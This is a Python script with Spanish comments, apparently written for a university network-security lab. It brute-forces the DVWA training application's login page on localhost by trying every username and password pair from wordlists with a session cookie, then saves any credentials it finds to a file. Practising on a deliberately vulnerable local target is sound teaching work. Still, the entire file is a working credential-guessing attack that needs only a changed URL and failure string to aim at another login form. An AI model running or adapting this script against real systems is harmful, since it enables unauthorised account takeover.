#!/usr/bin/env python3
"""
Uso: python3 atack.py -u URL -L users.txt -P passwords.txt -c COOKIE
"""

import requests
import sys

def cargar_wordlist(archivo):
   
    try:
        with open(archivo, 'r', encoding='utf-8', errors='ignore') as f:
            return [linea.strip() for linea in f if linea.strip()]
    except FileNotFoundError:
        print(f"[!] Error: Archivo '{archivo}' no encontrado")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error al leer '{archivo}': {e}")
        sys.exit(1)

def main():
    # Verificador
    if len(sys.argv) != 9:
        print("=" * 70)
        print("  Sw para fuerza bruta")
        print("=" * 70)
        print("\nUso:")
        print("  python3 atack.py -u URL -L users.txt -P passwords.txt -c COOKIE")
        print("\nEjemplo:")
        print("  python3 atack.py -u http://localhost:8080/vulnerabilities/brute/ \\")
        print("                   -L users.txt -P passwords.txt \\")
        print("                   -c 9rcuaqj66a12l4rhvj2le69i12")
        print()
        sys.exit(1)
    
    # Parsear argumentos
    args = {}
    for i in range(1, len(sys.argv), 2):
        args[sys.argv[i]] = sys.argv[i+1]

    url = args.get('-u')
    archivo_usuarios = args.get('-L')
    archivo_passwords = args.get('-P')
    cookie = args.get('-c')
    
    # Validar
    if not all([url, archivo_usuarios, archivo_passwords, cookie]):
        print("[!] Error: Faltan parámetros requeridos")
        print("    Usa: -u URL -L users.txt -P passwords.txt -c COOKIE")
        sys.exit(1)
    
    # Decoracion (no es necesario pero desde que aprendi a multiplicar caracteres lo uso, queda muy bien)
    print("=" * 70)
    print("  Laboratorio 2, Criptografia y Seguridad en Redes")
    print("=" * 70)
    print()
    
    # Cargar diccionarios
    print(f"[*] Cargando usuarios desde: {archivo_usuarios}")
    usuarios = cargar_wordlist(archivo_usuarios)
    print(f"[✓] Usuarios cargados: {len(usuarios)}")
    
    print(f"[*] Cargando contraseñas desde: {archivo_passwords}")
    passwords = cargar_wordlist(archivo_passwords)
    print(f"[✓] Contraseñas cargadas: {len(passwords)}")
    
    print(f"\n[*] URL objetivo: {url}")
    print(f"[*] Total de combinaciones: {len(usuarios) * len(passwords)}")
    print("-" * 70)
    
    # headers
    headers = {
        "Cookie": f"PHPSESSID={cookie}; security=low",
        "User-Agent": "Mozilla/5.0 Windows",
        "Referer": "http://localhost:8080/vulnerabilities/brute/"
    }
    
  
    credenciales_validas = []
    intentos = 0
    
    try:
        for usuario in usuarios:
            for password in passwords:
                intentos += 1
                
                params = {
                    "username": usuario,
                    "password": password,
                    "Login": "Login"
                }
                
                try:
                    response = requests.get(url, params=params, headers=headers, timeout=10)
                    
               
                    if "Username and/or password incorrect" not in response.text:
                        print(f"[+] ✓ ÉXITO [{intentos}/{len(usuarios)*len(passwords)}]: {usuario}:{password}")
                        credenciales_validas.append((usuario, password))
                        break
                    else:
                        print(f"[-] ✗ [{intentos}/{len(usuarios)*len(passwords)}]: {usuario}:{password}")
                        
                except requests.exceptions.Timeout:
                    print(f"[!] Timeout en: {usuario}:{password}")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error de conexión: {e}")
                    break
    
    except KeyboardInterrupt:
        print("\n\n[!]   ATAQUE INTERRUMPIDO POR EL USUARIO")
        print(f"[*] Intentos realizados antes de cancelar: {intentos}/{len(usuarios)*len(passwords)}")
    
    
    print("-" * 70)
    print(f"\n[*] Resumen del ataque")
    print(f"[*] Total de intentos realizados: {intentos}/{len(usuarios)*len(passwords)}")
    print(f"[*] Credenciales válidas encontradas: {len(credenciales_validas)}")
    
    if credenciales_validas:
        print("\n" + "=" * 70)
        print("[+] CREDENCIALES VÁLIDAS:")
        print("=" * 70)
        for usuario, password in credenciales_validas:
            print(f"    Usuario: {usuario:<20} | Contraseña: {password}")
        print("=" * 70)
        
        
        with open("credenciales_encontradas.txt", "w") as f:
            f.write("Credenciales válidas encontradas:\n")
            f.write("=" * 50 + "\n")
            for usuario, password in credenciales_validas:
                f.write(f"Usuario: {usuario} | Contraseña: {password}\n")
        print(f"\n[*] Resultados guardados en: credenciales_encontradas.txt")
    else:
        print("\n[-] No se encontraron credenciales válidas")

if __name__ == "__main__":
    main()
